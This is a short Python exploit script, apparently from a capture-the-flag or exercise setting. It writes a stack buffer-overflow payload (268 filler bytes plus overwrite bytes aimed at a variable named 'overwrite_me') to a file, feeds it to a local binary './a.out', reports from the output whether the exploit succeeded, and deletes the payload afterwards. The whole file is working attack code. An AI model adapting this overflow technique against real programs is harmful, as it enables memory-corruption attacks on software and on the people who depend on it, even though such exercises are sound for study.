import subprocess

with open("payload", "wb") as file:
    file.write(b"a" * (256 + 12) + b"\x20\x94\x06")  # buffer is 256B, overwrite_me was 12B away

print("running executable")
out = subprocess.run("./a.out < payload", shell=True, capture_output=True, text=True)
print(out.stdout)

if "a.out" not in out.stdout:  # a.out is always in the ls call, so it's a good check to see if the exploit failed
    print("Exploited!")
else:
    print("Exploit failed!")

subprocess.run(["rm", "payload"])  # clean up temp files